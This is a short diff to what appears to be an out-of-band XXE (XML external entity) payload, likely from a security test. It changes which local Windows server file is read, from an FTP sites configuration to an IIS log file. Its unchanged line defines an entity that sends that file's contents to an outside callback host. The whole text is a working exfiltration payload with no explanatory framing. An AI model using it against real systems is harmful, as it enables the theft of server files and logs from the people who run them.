@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///C:\inetpub\ftproot\ftpsites.xml">
+<!ENTITY % data SYSTEM "file:///C:\inetpub\logs\LogFiles\W3SVC1_20241022.log">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://hyjlib4ebaxelqil748wb44j2a81w2kr.l.prod.burpcloth.infosec.a2z.com/?%data;'>">
